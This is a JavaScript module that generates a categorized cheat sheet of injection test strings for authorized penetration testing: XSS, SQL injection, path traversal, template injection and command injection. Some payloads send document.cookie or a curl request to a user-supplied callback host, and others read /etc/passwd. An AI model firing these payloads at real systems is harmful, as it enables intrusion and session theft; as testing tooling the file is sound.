// Injection Payloads — pure, DOM-free core. A categorized cheat sheet of
// injection test strings for authorized testing. A `{{M}}` marker in any
// payload is replaced with a user-supplied value (e.g. an OOB callback host or
// a unique reflection canary). Generation only — nothing is sent.
// DOM-free for `node --test`.

const LIBRARY = {
  XSS: [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
    '"><img src=x onerror=fetch(`//{{M}}/x?c=${document.cookie}`)>',
    '{{M}}', // bare canary to find reflection points
  ],
  SQLi: [
    "'",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT NULL-- -",
    "1; WAITFOR DELAY '0:0:5'-- -",
    "' AND SLEEP(5)-- -",
    "') OR ('1'='1",
  ],
  'Path traversal': [
    '../../../../etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..\\..\\..\\..\\windows\\win.ini',
    '/etc/passwd%00.png',
  ],
  SSTI: [
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{{7*7}}${7*7}',
    "{{config}}",
    '{{M}}{{7*7}}', // canary + probe
  ],
  'Command injection': [
    '; id',
    '| id',
    '$(id)',
    '`id`',
    '; curl http://{{M}}/ci',
    '%0a id',
    '& ping -c 3 {{M}} &',
  ],
};

// All category names.
export function categories() {
  return Object.keys(LIBRARY);
}

// Payloads for one category, with {{M}} replaced by `marker` (default left as-is).
export function payloadsFor(category, marker = '{{M}}') {
  const list = LIBRARY[category];
  if (!list) return [];
  return list.map((p) => applyMarker(p, marker));
}

// Every category at once: { category: [payloads] }.
export function allPayloads(marker = '{{M}}') {
  const out = {};
  for (const cat of categories()) out[cat] = payloadsFor(cat, marker);
  return out;
}

function applyMarker(payload, marker) {
  if (marker == null || marker === '{{M}}' || marker === '') return payload;
  return payload.split('{{M}}').join(marker);
}
